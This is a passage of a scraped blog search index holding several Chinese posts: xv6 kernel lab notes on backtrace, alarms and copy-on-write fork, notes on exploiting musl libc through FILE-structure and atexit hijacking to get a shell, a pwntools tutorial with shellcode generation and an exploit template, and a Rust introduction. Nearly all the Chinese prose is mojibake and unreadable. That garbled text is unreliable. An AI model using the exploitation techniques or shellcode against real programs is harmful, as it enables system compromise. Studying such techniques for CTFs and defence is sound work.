0x00000001ffff9fa00x3fffff9f90: 0x0000003fffff9fc0 0x00000000000000200x3fffff9fa0: 0x0000000087f70000 0x00000000800090300x3fffff9fb0: 0x0000003fffff9fe0 0x000000008000201c0x3fffff9fc0: 0x0000000000000063 0x00000000800090300x3fffff9fd0: 0x0000003fffffa000 0x0000000080001d120x3fffff9fe0: 0x0000000000000063 0x0000000000014f500x3fffff9ff0: 0x0000000000003fd0 0x00000000000000120x3fffffa000: Cannot access memory at address 0x3fffffa000 ä½†æ˜¯åœ¨ç”¨æˆ·æ ˆä¸­ï¼Œæœ€åä¸€ä¸ªæ ˆå¸§æŒ‡é’ˆæ˜¯é¡µé¢çš„é¦–åœ°å€ - 0x10ï¼Œå°±å¾ˆæ€ªã€‚ã€‚ã€‚ æ¯”å¦‚åœ¨ sh æ‰“å° $ æ—¶ï¼ŒæŸ¥çœ‹ç”¨æˆ·æ ˆï¼Œ0x4fd0 -&gt; 0x4fe0 -&gt; 0x4ff0ï¼Œæœ€åä¸€ä¸ªæŒ‡é’ˆæ˜¯ 0x4ff0 12345678910(gdb) x/20gx $fp-0x100x4f80: 0x0000000000004fd0 0x0000000000000ade0x4f90: 0x0000000000000000 0x05050505050505050x4fa0: 0x0505050505050505 0x05050505050505050x4fb0: 0x00000000000008a8 0x00000000000000000x4fc0: 0x0000000000004fe0 0x0000000000000b660x4fd0: 0x0000000000003fd0 0x00000000000000de0x4fe0: 0x0000000000004ff0 0x00000000000000000x4ff0: 0x0000000000006873 0x00000000000000000x5000: Cannot access memory at address 0x5000 ç®—äº†ï¼Œä¸ç®¡è¿™ä¹ˆå¤šäº†ï¼Œåæ­£ä¹Ÿåªç”¨å›æº¯å†…æ ¸æ ˆ æŠŠ backtrace è´´åˆ° kernel/printf.c ä¸­ï¼Œåœ¨ kernel/defs.h ä¸­æ·»åŠ å£°æ˜ï¼Œç„¶ååœ¨ sys_sleep è°ƒç”¨å°±å¥½äº† kernel/printf.c12345678voidbacktrace(void){ printf(&quot;backtrace:\\n&quot;); for(uint64 fp = r_fp(); fp != PGROUNDUP(fp); fp = *(uint64*)(fp-0x10)){ printf(&quot;%p\\n&quot;, *(uint64*)(fp-0x8)); }} è·å¾—çš„åœ°å€å¯ä»¥é€šè¿‡ addr2line å¾—åˆ°å¯¹åº”çš„ç¨‹åºä»£ç çš„ä½ç½®ï¼Œä¾¿äºè°ƒè¯• å¦‚ addr2line -e kernel/kernel æ”¾åˆ° panic å‡½æ•°ä¸­ï¼Œå¯ä»¥æ›´å¥½åœ°æ–¹ä¾¿å†…æ ¸å´©æºƒåŸå›  Alarmæ·»åŠ ä¸€ä¸ªç”¨æˆ·çº§çš„å®šæ—¶å™¨ä¸­æ–­ï¼Œä¹Ÿå°±æ˜¯ sigalarm(interval, handler) å’Œ sigreturn() æ¯ n æ¬¡ç¡¬ä»¶è®¡æ—¶å™¨ä¸­æ–­ï¼Œå°±ä¼šè°ƒç”¨ä¸€æ¬¡ handlerï¼Œåœ¨ handler ä¸­è¦æœ‰ sigreturn ä¿è¯è¿˜åŸåˆ°åŸæœ¬çš„çŠ¶æ€ ç¬”è€…å¤©çœŸåœ°ä»¥ä¸ºä¿å­˜ p-&gt;trapframe-&gt;epc å°±è¡Œäº†ï¼Œwsfwï¼ˆè¿˜æœ‰é€šç”¨å¯„å­˜å™¨è¦è¿›è¡Œä¿å­˜ï¼‰ åœ¨ proc ç»“æ„ä½“æ·»åŠ å˜é‡kernel/proc.h123456789struct proc { ... int ticks; int alarm_interval; uint64 alarm_handler; struct trapframe *alarm_state;} ticks ä¿å­˜è®¡æ—¶å™¨ä¸­æ–­æ¬¡æ•°ï¼Œæ¯ä¸­æ–­ä¸€æ¬¡ï¼Œticks++ alarm_state ç›´æ¥ç”¨ struct trapframe ç»“æ„ä½“ä¿å­˜åŸçŠ¶æ€ï¼ˆç¬”è€…æ˜¯ä¸ªæ‡’äºº åœ¨æ¯æ¬¡è°ƒç”¨ handler å‰ï¼Œå°†å…¶æŒ‡å‘ p-&gt;trapframe + 1ï¼Œsigreturn åç½®é›¶ åˆå§‹åŒ–kernel/proc.c12345678910111213static struct proc*allocproc(void){ ... p-&gt;ticks = 0; p-&gt;alarm_interval = 0; p-&gt;alarm_handler = 0; p-&gt;alarm_state = 0; return p;} æ·»åŠ ç³»ç»Ÿè°ƒç”¨kernel/sysproc.h1234567891011121314151617181920212223242526uint64sys_sigalarm(void){ int ticks; uint64 handler; struct proc *p = myproc(); argint(0, &amp;ticks); argaddr(1, &amp;handler); p-&gt;alarm_interval = ticks; p-&gt;alarm_handler = handler; return 0;}uint64sys_sigreturn(void){ struct proc *p = myproc(); uint64 a0 = p-&gt;alarm_state-&gt;a0; memmove(p-&gt;trapframe, p-&gt;alarm_state, sizeof(struct trapframe)); memset(p-&gt;alarm_state, 0, sizeof(struct trapframe)); p-&gt;alarm_state = 0; return a0;} è®¡æ—¶å™¨ä¸­æ–­æ—¶åˆ¤æ–­æ˜¯å¦æ‰§è¡Œ handlerkernel/trap.c12345678910111213141516voidusertrap(void){ ... // give up the CPU if this is a timer interrupt. if(which_dev == 2) { yield(); p-&gt;ticks++; if(p-&gt;alarm_interval &amp;&amp; !p-&gt;alarm_state &amp;&amp; p-&gt;ticks % p-&gt;alarm_interval == 0) { p-&gt;alarm_state = p-&gt;trapframe + 1; memmove(p-&gt;alarm_state, p-&gt;trapframe, sizeof(struct trapframe)); p-&gt;trapframe-&gt;epc = p-&gt;alarm_handler; } }} æœ€åæ·»åŠ ä¸€äº›å£°æ˜å³å¯ Option challenge exercisesbacktrace æ‰“å°å‡½æ•°åå’Œè¡Œå·#todo","link":"/2022/10/31/Lab4_Traps/"},{"title":"Musl libc Exploration","text":"æŒç»­æ›´æ–°ï¼ˆæˆ–è®¸ï¼‰ ç¯å¢ƒï¼šx64 musl-1.2.2 FSOPFILE ç»“æ„./src/internal/stdio_impl.h12345678910111213141516171819202122232425262728struct _IO_FILE { unsigned flags; unsigned char *rpos, *rend; int (*close)(FILE *); unsigned char *wend, *wpos; unsigned char *mustbezero_1; unsigned char *wbase; size_t (*read)(FILE *, unsigned char *, size_t); size_t (*write)(FILE *, const unsigned char *, size_t); off_t (*seek)(FILE *, off_t, int); unsigned char *buf; size_t buf_size; FILE *prev, *next; int fd; int pipe_pid; long lockcount; int mode; volatile int lock; int lbf; void *cookie; off_t off; char *getln_buf; void *mustbezero_2; unsigned char *shend; off_t shlim, shcnt; FILE *prev_locked, *next_locked; struct __locale_struct *locale;}; ç›¸æ¯” glibc çš„ FILE ç»“æ„ï¼Œmusl libc çš„ FILE ç»“æ„æ›´åŠ ç®€å•ï¼Œä¹Ÿæ›´å®¹æ˜“åˆ©ç”¨ æœ‰å››ç±» FILE æŒ‡é’ˆï¼šofl_headã€stdinã€stdoutã€stderr ofl_head ç±»ä¼¼ glibc çš„ _IO_list_allï¼Œæ‰“å¼€çš„æ–‡ä»¶é“¾è¡¨å¤´ï¼Œä¸ºå…¨å±€å˜é‡ å¯ä»¥ç›´æ¥åŠ«æŒåˆ°ä¼ªé€ çš„ FILE ç»“æ„ stdinã€stdoutã€stderr å›ºå®šçš„ä¸‰ä¸ª FILE æŒ‡é’ˆï¼Œä¸å¯åŠ«æŒ å¯ä»¥æ›´æ”¹å…¶æŒ‡å‘çš„å†…å­˜ç©ºé—´ åˆ©ç”¨./src/stdio/__stdio_exit.c12345678910111213141516static void close_file(FILE *f){ if (!f) return; FFINALLOCK(f); if (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, 0, 0); if (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);}void __stdio_exit(void){ FILE *f; for (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f); close_file(__stdin_used); close_file(__stdout_used); close_file(__stderr_used);} åœ¨ exit() æ—¶ä¼šè°ƒç”¨ __stdio_exit() ï¼Œå…¶ä¸­ close_file() ä¼šè°ƒç”¨ FILE çš„ä¸¤ä¸ªå‡½æ•° write å’Œ seek FSOP æ¡ä»¶ f-&gt;lock == 0 ä¸ä¸º 0 ä¼šè°ƒç”¨ futex ç³»ç»Ÿè°ƒç”¨ï¼Œç„¶åå¯„äº† flags == â€œ/bin/sh\\x00â€ è°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°éƒ½æ˜¯ FILE æŒ‡é’ˆï¼Œåœ¨åŠ«æŒä¸º system æ—¶ï¼Œå°† flags æ”¹ä¸º /bin/sh\\x00 å³å¯ è°ƒç”¨ write wpo != wbase è°ƒç”¨ seek rpos != rend exit hijackğŸ§å¸ˆå‚…æåŠçš„ ç¬”è€…è‡ªå·±èµ·çš„åï¼ˆ ./src/exit/atexit.c12345678910111213141516171819202122232425#define COUNT 32static struct fl{ struct fl *next; void (*f[COUNT])(void *); void *a[COUNT];} builtin, *head;static int slot;static volatile int lock[1];volatile int *const __atexit_lockptr = lock;void __funcs_on_exit(){ void (*func)(void *), *arg; LOCK(lock); for (; head; head=head-&gt;next, slot=COUNT) while(slot--&gt;0) { func = head-&gt;f[slot]; arg = head-&gt;a[slot]; UNLOCK(lock); func(arg); LOCK(lock); }} åœ¨ exit() æ—¶ï¼Œä¼šè°ƒç”¨ __funs_on_exit() é€šè¿‡ head æŒ‡é’ˆæ‰§è¡Œæ³¨å†Œçš„ç»ˆæ­¢å‡½æ•° åˆ©ç”¨æ¡ä»¶ å°† head åŠ«æŒåˆ°å¯æ§å†…å­˜ç©ºé—´ ç¬¬ä¸€ä¸ªå¾ªç¯å› ä¸º slot == 0ï¼Œä¼šç›´æ¥è·³è¿‡ ä»è€Œ head = head-&gt;next *(head-&gt;next + 0x100) == addr_system *(head-&gt;next + 0x200) == addr_binsh åœ¨ç†æƒ³çš„å †é£æ°´æƒ…å†µä¸‹ï¼Œåªéœ€è¦ä»»æ„å†™ä¸€æ¬¡ï¼Œå³å¯é€šè¿‡ exit() æ‹¿åˆ° shell","link":"/2022/10/11/Musl%20libc%20Exploration/"},{"title":"Lab5 Copy-on-write fork","text":"é¡µè¡¨ç‰›é€¼ å®ç° Copy-on-write fork æ·»åŠ å®å®šä¹‰ PTE_COWï¼Œä½¿ç”¨ PTE çš„ RSW æœ€ä½æœ‰æ•ˆä½ï¼Œæ¥æ ‡è¯†æ˜¯å¦æ˜¯ COW é¡µï¼Œåªç”¨äºå¯å†™é¡µ kernel/riscv.h1#define PTE_COW (1L &lt;&lt; 8) æ·»åŠ  reference count æ ‡è¯†ä¸€ä¸ªç‰©ç†é¡µé¢è¢«å‡ ä¸ªç”¨æˆ·é¡µè¡¨æŒ‡å‘ï¼Œåˆå§‹åŒ–ï¼Œå¢å‡ æç¤ºä½¿ç”¨ kenel/kalloc.c é‡Œ kinit() é‡Œ freerange() çš„èŒƒå›´ï¼Œé€šè¿‡è°ƒè¯• end = 0x80041c50ï¼ŒPHYSTOP = 0x88000000ï¼Œç›¸å‡é™¤ä»¥ 4096 å¾— 0x7fbe ä½†æ˜¯åœ¨ make qemu æ—¶ï¼Œè¿‡ usertests -q æ—¶ï¼Œæœ€åä¼šæ˜¾ç¤ºä¸¢å¤±ä¸€äº›é¡µï¼Œä½†æ˜¯ make CPUS=1 qemu-gdb æ—¶åˆæ˜¾ç¤ºé€šè¿‡ï¼Œå¯èƒ½å­å•Šå¤šæ ¸æ—¶ä¼šå‡ºç°ä¸€äº›é—®é¢˜ï¼Œå¾ˆæ€ª å°† 0x7fbe æ”¹ä¸º 0x7fc0 å°±æ²¡æœ‰é—®é¢˜ï¼Œä¸æ˜¯å¾ˆæ‡‚ï¼Œå¦‚æœæœ‰äº†è§£çš„å¸ˆå‚…å¯ä»¥å‘Šè¯‰æˆ‘ğŸ ç¬”è€…æŠŠå®ƒæ”¾åˆ° kmem é‡Œï¼Œå¢å‡æ—¶ç”¨ kmem.lock é” kernel/kalloc.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778struct { struct spinlock lock; struct run *freelist; uint refers[0x7fc0];} kmem;voidkinit(){ initlock(&amp;kmem.lock, &quot;kmem&quot;); acquire(&amp;kmem.lock); for(int i = 0; i &lt; sizeof(kmem.refers) / sizeof(kmem.refers[0]); ++i) { kmem.refers[i]++; } release(&amp;kmem.lock); freerange(end, (void*)PHYSTOP);}voidkfree(void *pa){ struct run *r; if(((uint64)pa % PGSIZE) != 0 || (char*)pa &lt; end || (uint64)pa &gt;= PHYSTOP) panic(&quot;kfree&quot;); krefDecre(pa); if(!kref(pa)) { // Fill with junk to catch dangling refs. memset(pa, 1, PGSIZE); r = (struct run*)pa; acquire(&amp;kmem.lock); r-&gt;next = kmem.freelist; kmem.freelist = r; release(&amp;kmem.lock); }}void *kalloc(void){ struct run *r; acquire(&amp;kmem.lock); r = kmem.freelist; if(r) kmem.freelist = r-&gt;next; release(&amp;kmem.lock); if(r) { krefIncre((void*)r); memset((char*)r, 5, PGSIZE); // fill with junk } return (void*)r;}uintkref(void *pa){ return kmem.refers[(pa - (void*)end)/4096];}voidkrefIncre(void *pa){ acquire(&amp;kmem.lock); kmem.refers[(pa - (void*)end)/4096]++; release(&amp;kmem.lock);}voidkrefDecre(void *pa) { acquire(&amp;kmem.lock); kmem.refers[(pa - (void*)end)/4096]--; release(&amp;kmem.lock);} ä¿®æ”¹ uvmcopyï¼Œåœ¨å¤åˆ¶æ—¶å°†å­è¿›ç¨‹é¡µè¡¨ç›´æ¥æŒ‡å‘çˆ¶è¿›ç¨‹é¡µè¡¨å¯¹åº”çš„ç‰©ç†åœ°å€ å› ä¸ºåœ¨è°ƒç”¨ fork æ—¶ï¼Œå¤åˆ¶å†…å­˜å°±æ˜¯ç›´æ¥è°ƒç”¨ uvmcopyï¼Œä¿®æ”¹è¿™ä¸ªå°±è¡Œ å½“é‡åˆ°å¯å†™çš„é¡µæ—¶ï¼Œå–æ¶ˆ PTE_Wï¼Œæ·»åŠ  PTE_COW kernel/vm.c123456789101112131415161718192021222324252627282930313233intuvmcopy(pagetable_t old, pagetable_t new, uint64 sz){ pte_t *pte; uint64 pa, i; uint flags; for(i = 0; i &lt; sz; i += PGSIZE){ if((pte = walk(old, i, 0)) == 0) panic(&quot;uvmcopy: pte should exist&quot;); if((*pte &amp; PTE_V) == 0) panic(&quot;uvmcopy: page not present&quot;); pa = PTE2PA(*pte); flags = PTE_FLAGS(*pte); if(flags &amp; PTE_W) { flags = (flags &amp; ~PTE_W) | PTE_COW; } if(mappages(new, i, PGSIZE, pa, flags) != 0){ goto err; } if(flags &amp; PTE_COW) { *pte = PA2PTE(pa) | flags; } krefIncre((void*)pa); } return 0; err: uvmunmap(new, 0, i / PGSIZE, 1); return -1;} æ€ä¹ˆæœ‰äººæ€»æ˜¯æŠŠ &amp; å’Œ | çš„åŠŸèƒ½å†™å ä¿®æ”¹ kernel/trap.c çš„ usertrap å’Œ kernel/vm.c çš„ copyoutï¼Œæ·»åŠ é‡åˆ° COW é¡µçš„æƒ…å†µ æ³¨æ„è™šæ‹Ÿåœ°å€è¦å°äº MAXVAï¼Œå¦åˆ™åœ¨ walk æ—¶ä¼šç›´æ¥å‡ºç° panic kernel/vm.c12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849intcopyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len){ uint64 n, va0, pa0; pte_t *pte = 0; while(len &gt; 0){ va0 = PGROUNDDOWN(dstva); if(dstva &lt; MAXVA) { pte = walk(pagetable, dstva, 0); } if(pte &amp;&amp; (*pte &amp; PTE_COW)) { if(copyCOW(pte)) { return -1; } } pa0 = walkaddr(pagetable, va0); if(pa0 == 0) return -1; n = PGSIZE - (dstva - va0); if(n &gt; len) n = len; memmove((void *)(pa0 + (dstva - va0)), src, n); len -= n; src += n; dstva = va0 + PGSIZE; } return 0;}intcopyCOW(pte_t *pte) { uint64 pa = PTE2PA(*pte); uint flags = (PTE_FLAGS(*pte) &amp; ~PTE_COW) | PTE_W; *pte = PA2PTE(pa) | flags; if(kref((void*)pa) != 1) { char *mem = kalloc(); if(mem == 0) { return -1; } else { memmove(mem, (char*)pa, PGSIZE); *pte = PA2PTE(mem) | flags; krefDecre((void*)pa); } } return 0;} kernel/trap.c12345if(r_scause() == 15 &amp;&amp; r_stval() &lt; MAXVA &amp;&amp; (*(pte = walk(p-&gt;pagetable, r_stval(), 0)) &amp; PTE_COW)) { // store COW page fault if(copyCOW(pte)) { setkilled(p); } æœ€ååœ¨ kernel/defs.h é‡Œæ·»åŠ ä¸€äº›å‡½æ•°å£°æ˜å³å¯ Optional challenge exerciseæµ‹é‡ä½ çš„ COW å®ç°å‡å°‘äº†å¤šå°‘å­—èŠ‚çš„å¤åˆ¶å’Œå¤šå°‘é¡µç‰©ç†å†…å­˜çš„åˆ†é…#todo","link":"/2022/11/12/Lab5_Copy_on_write_fork/"},{"title":"Pwntools çš„å®‰è£…åŠä½¿ç”¨","text":"è®°å½•ä¸€ä¸‹å®‰è£… pwntools çš„è¿‡ç¨‹å’ŒåŸºæœ¬ä½¿ç”¨ Pwntools å®‰è£…1pip install pwntools å¦‚æœå‡ºç°ä¸‹é¢çš„ warning WARNING: The scripts asm, checksec, common, constgrep, cyclic, debug, disablenx, disasm, elfdiff, elfpatch, errno, hex, main, phd, pwn, pwnstrip, scramble, shellcraft, template, unhex, update and version are installed in '/home/yahu/.local/bin' which is not on PATH. Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location. 1234# åœ¨ .bashrc æ–‡ä»¶æ·»åŠ export PATH=~/.local/bin:$PATH# ç„¶å source ç›¸åº”çš„æ–‡ä»¶å³å¯source ~/.bashrc è¿™æ ·å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ pwntools è‡ªå¸¦çš„å·¥å…·ï¼Œå¦‚ checksecã€cyclic ç­‰ Pwntools ä½¿ç”¨å¸¸ç”¨å·¥å…·checksecç”¨äºæŸ¥çœ‹æ–‡ä»¶çš„ä¿æŠ¤æœºåˆ¶ã€æ¶æ„ä¿¡æ¯ç­‰ 1234567$ checksec testArch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) cyclicç”¨äºéšæœºç”Ÿæˆä¸€ä¸²æœ‰åºå­—ç¬¦ä¸² 12$ cyclic 50aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama å¸¸ç”¨ python æ¨¡å—ç¯å¢ƒè®¾ç½®12# è®¾ç½® ç³»ç»Ÿã€æ¶æ„ã€æ—¥å¿—è¾“å‡ºç­‰çº§context(os='linux', arch='i386/amd64', log_level='debug') å¼•å…¥ç¨‹åº12345678from pwn import * # è¿œç¨‹r = remote('8.8.8.8', 8888)# æœ¬åœ°p = process('./test')# æœ€ç»ˆè¿›è¡Œäº¤äº’r.interactive()p.interactive() ELFæ–‡ä»¶1234567891011121314# å¼•å…¥ç¨‹åºæ–‡ä»¶def ELF(path : str)elf = ELF('./test') = p.elf# è·å–å‡½æ•°åœ°å€addr_func = elf.sym['func_name']# è·å–å‡½æ•° plt åœ°å€plt_func = elf.plt['func_name']# è·å–å‡½æ•° got åœ°å€got_func = elf.got['func_name']&gt;&gt;&gt; elf.sym['main']134514548 å‘é€æ•°æ®1234def send(data : bytes)def sendafter(delim : bytes, data : bytes)p.sendline(bytes)p.sendlineafter(bytes, bytes) æ¥å—æ•°æ®12345p.recv()p.recv(int)p.recvline()p.recvuntil(bytes)p.recvafter(bytes) æ•°æ®å¤„ç†1234567891011121314151617# å°†æ•°æ®æ‰“åŒ…æˆ n ä½çš„äºŒè¿›åˆ¶åŒ…def p8(number : bytes) -&gt; intp16(bytes)p32(bytes)p64(bytes)&gt;&gt;&gt; p32(114514)b'R\\xbf\\x01\\x00'# å°† n ä½çš„äºŒè¿›åˆ¶åŒ…è§£åŒ…æˆæ•°æ®def u8(number : int) -&gt; bytesu16(int)u32(int)u64(int)&gt;&gt;&gt; u32(b'R\\xbf\\x01\\x00')114514 å…¶ä»–å¸¸ç”¨123456789101112131415161718# æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨def fmtstr_payload(offset : int , writes : map) -&gt; bytes# åç§»ä¸º1ï¼Œå°†åœ°å€ä¸º2çš„å€¼ä¿®æ”¹æˆ3ï¼Œå°†åœ°å€ä¸º6çš„å€¼ä¿®æ”¹æˆ7&gt;&gt;&gt; fmtstr_payload(1, {2 : 3, 6 : 7})b'%3c%6$lln%4c%7$hhnaa\\x02\\x00\\x00\\x00\\x06\\x00\\x00\\x00'# ç”Ÿæˆ shellcode å­—ç¬¦ä¸²ï¼Œä¼šéšæ¶æ„è®¾ç½®è€Œç”Ÿæˆå¯¹åº”çš„ shellcodeshellcraft.sh()shellcraft.i386.sh()shellcraft.amd64.sh()shellcraft.arm.sh()# å°†å­—ç¬¦ä¸²å½¢å¼çš„æ±‡ç¼–è½¬æˆæœºå™¨ç asm()&gt;&gt;&gt; asm(shellcraft.sh())b'jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80' ä¸€èˆ¬æµç¨‹1234567891011from pwn import *context(os='linux', arch='i386', log_level='debug')# r = remote('8.8.8.8', 8888)p = process('./test')elf = ELF('./test')...p.send(payload)p.interactive()","link":"/2022/02/05/Pwntools%20%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/"},{"title":"Rust å…¥é—¨","text":"ä»…ä»…ä»‹ç» Rust çš„å®‰è£…ã€Cargoã€å˜é‡ã€æ•°æ®ç±»å‹ã€å‡½æ•°å’Œæ§åˆ¶æµ ç¯å¢ƒï¼šUbuntu 22.04 rustc 1.68.2 å®‰è£…12345678# å®‰è£…$ curl --proto '=https' --tlsv1.2 https://sh.rustup.rs -sSf | sh# æ›´æ–°$ rustup update# å¸è½½$ rustup self uninstall å®‰è£…æ—¶ä¼šä¸‹è½½ rustup å·¥å…·ï¼Œå¹¶å®‰è£…æœ€æ–°ç‰ˆ Rust ä¸€ç³»åˆ—å·¥å…·ï¼ˆç¼–è¯‘å™¨ rustc ç­‰ï¼‰ rustup æ˜¯ä¸€ä¸ªç®¡ç† Rust ç‰ˆæœ¬å’Œç›¸å…³å·¥å…·çš„å‘½ä»¤è¡Œå·¥å…· Hello world!ç¨‹åºå‘˜ä¼ ç»Ÿæ~ hello.rs12345// ä½¿ç”¨ rustc hello.rs ç¼–è¯‘fn main() { println!(&quot;Hello world!&quot;);} main å‡½æ•°ï¼šä¸ç”¨å¤šè¯´ï¼Œç¨‹åºå…¥å£ println!ï¼šè°ƒç”¨äº†ä¸€ä¸ªå®ï¼ˆå¦‚æœæ˜¯è°ƒç”¨å‡½æ•°ï¼Œåé¢æ²¡æœ‰!ï¼‰ &quot;Hello world!&quot;ï¼šå°†å­—ç¬¦ä¸²ä¼ é€’ç»™ println åˆ†å· ; ç»“å°¾ï¼šå¤§éƒ¨åˆ†è¯­å¥éƒ½ä»¥é—®å·ç»“å°¾ CargoCargo æ˜¯ Rust çš„æ„å»ºç³»ç»Ÿå’ŒåŒ…ç®¡ç†å™¨ã€‚å¤§å¤šæ•° Rustacean ä»¬ä½¿ç”¨ Cargo æ¥ç®¡ç†ä»–ä»¬çš„ Rust é¡¹ç›®ï¼Œå› ä¸ºå®ƒå¯ä»¥ä¸ºä½ å¤„ç†å¾ˆå¤šä»»åŠ¡ï¼Œæ¯”å¦‚æ„å»ºä»£ç ã€ä¸‹è½½ä¾èµ–åº“å¹¶ç¼–è¯‘è¿™äº›åº“ã€‚ ä¸‹é¢çš„å‘½ä»¤ä¼šåˆ›å»ºä¸€ä¸ª hello_cargo çš„é¡¹ç›® 1$ cargo new hello_cargo é‡Œé¢æœ‰ä¸€ä¸ª Cargo.toml æ–‡ä»¶ï¼Œè¿™æ˜¯ Cargo çš„é…ç½®æ–‡ä»¶ Cargo.toml12345678[package]name = &quot;hello_cargo&quot;version = &quot;0.1.0&quot;edition = &quot;2021&quot;# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html[dependencies] [package]ï¼šè¡¨æ˜ä¸‹é¢ä¸ºä¸€ä¸ªåŒ…çš„é…ç½® [dependencies]ï¼šç½—åˆ—é¡¹ç›®ä½¿ç”¨çš„ä¾èµ–ï¼Œä¾èµ–çš„ä»£ç åŒ…ä¹Ÿè¢«ç§°ä¸º crate æ„å»ºå¹¶è¿è¡Œé¡¹ç›®ä¸‹é¢çš„å‘½ä»¤ç”¨äºæ„å»ºé¡¹ç›®ï¼Œå¹¶ç”Ÿæˆ target æ–‡ä»¶å¤¹å’Œ Cargo.lock æ–‡ä»¶ 1$ cargo build target/debug/hello_carge ä¸ºç¼–è¯‘å‡ºæ¥çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¿è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥ç¼–è¯‘å¹¶è¿è¡Œé¡¹ç›®ï¼Œæ›´åŠ æ–¹ä¾¿ 12345$ cargo run Compiling hello_cargo v0.1.0 (/home/humoooor/Code/RustPractice/hello_cargo) Finished dev [unoptimized + debuginfo] target(s) in 0.46s Running `target/debug/hello_cargo` Hello, world! ä¸‹é¢çš„å‘½ä»¤å¯ä»¥æ£€æŸ¥ä»£ç ç¡®ä¿å¯ä»¥ç¼–è¯‘ 123$ cargo check Checking hello_cargo v0.1.0 (/home/humoooor/Code/RustPractice/hello_cargo) Finished dev [unoptimized + debuginfo] target(s) in 0.20s å‘å¸ƒé¡¹ç›®åœ¨æ„å»ºæ—¶ä½¿ç”¨ --release å‚æ•°ï¼Œæ¥ä¼˜åŒ–ç¼–è¯‘é¡¹ç›®ï¼Œå¹¶åœ¨ target/release ç›®å½•ä¸‹ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯ç”¨ä¼˜åŒ–ç¼–è¯‘æ—¶é—´æ›´é•¿ï¼Œä½†æ˜¯è¿è¡Œé€Ÿåº¦æ›´å¿«ï¼Œæ²¡æœ‰è°ƒè¯•ä¿¡æ¯ 123$ cargo build --release Compiling hello_cargo v0.1.0 (/home/humoooor/Code/RustPractice/hello_cargo) Finished release [optimized] target(s) in 0.19s å˜é‡å’Œå¯å˜æ€§å˜é‡å®šä¹‰12345let [mut] {var_name}: {var_type} = {value};let x = &quot;-1&quot;;// å°† x ä» &quot;-1&quot; è½¬æ¢æˆ -1let x: i32 = x.parse().except(&quot;&quot;); value_type å’Œ value å¿…é¡»å‡ºç°ä¸€ä¸ªï¼Œåœ¨æŸäº›æƒ…å†µï¼ˆå¦‚ç±»å‹è½¬æ¢ï¼‰ä¸‹ï¼Œä¸¤è€…éƒ½è¦å‡ºç° æ¯æ¬¡åªå¯ä»¥å®šä¹‰ä¸€ä¸ªå˜é‡ å¯å˜æ€§ mutableåœ¨ Rust ä¸­ï¼Œå˜é‡é»˜è®¤æ˜¯ä¸å¯æ”¹å˜çš„ï¼ˆimmutableï¼‰ï¼Œåœ¨å£°æ˜å˜é‡æ—¶åœ¨å˜é‡åå‰åŠ ä¸Š mut ä½¿å…¶å…·æœ‰å¯å˜æ€§ 123456789fn main() {dd // x é»˜è®¤ä¸å¯å˜ï¼Œä¼šå‡ºç°ç¼–è¯‘é”™è¯¯ let x = 5; // æ·»åŠ  mut åï¼Œå…è®¸ x çš„å€¼æ”¹å˜ // let mut x = 5; println!(&quot;value of x: {x}&quot;); x = 6; println!(&quot;value of x: {x}&quot;);} å¸¸é‡ const123const {const_name}: {const_type} = {const_value}const PI: f32 = 3.14; å¿…é¡»æ³¨æ˜å¸¸é‡ç±»å‹ éšè—ä¸€ä¸ªå˜é‡åå¯ä»¥é‡å¤å£°æ˜ï¼Œä¾¿äºåœ¨ç±»å‹è½¬æ¢ç­‰æƒ…å†µæ—¶å¤ç”¨å˜é‡åï¼Œå®é™…ä¸Šæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ–°å˜é‡ï¼Œä¹‹å‰çš„å˜é‡ä¼šè¢«éšè—ï¼Œç›´åˆ°æ–°å˜é‡çš„ä½œç”¨åŸŸç»“æŸ 12345678910111213fn main() { let x = &quot;-5&quot;; { let mut x: i32 = x.parse().expect(&quot;Not a number&quot;); x = x + 5; println!(&quot;x = {x}&quot;); } println!(&quot;x = {x}&quot;);}// output:// x = 0// x = -5 åŸºæœ¬æ•°æ®ç±»å‹Rust æœ‰æ ‡é‡å’Œå¤åˆä¸¤ç±»æ•°æ®ç±»å‹ æ ‡é‡ç±»å‹æ•´å‹ integer Len signed unsigned 8-bit i8 i8 32-bit i32 i32 64-bit i64 i64 128-bit i128 i128 arch isize isize Rust é»˜è®¤ç±»å‹ä¸º i32 arch ä¾èµ–è®¡ç®—æœºæ¶æ„ï¼Œ64 ä½æ¶æ„ isize å°±æ˜¯ 64 ä½ æ•°å­—å¯ä½¿ç”¨ _ ä½œä¸ºåˆ†éš”ç¬¦ï¼Œæ–¹ä¾¿è¯»æ•°ï¼Œå¦‚ 1000 è¡¨ç¤ºä¸º 1_000 ä¹Ÿå¯ä»¥ä½¿ç”¨ç±»å‹åç¼€æ¥æŒ‡å®šæ•°å­—ç±»å‹ï¼Œå¦‚ 57u8 ä¸ºæ— ç¬¦å· 8-bit æ•´å‹ å­—é¢å€¼ ä¾‹å­ Hex 0xff Decimal 0o77 Octal 99 Binary 0b11 Byte bâ€™aâ€™ æµ®ç‚¹å‹ floatRust æµ®ç‚¹æ•°ç±»å‹æœ‰ f32 å’Œ 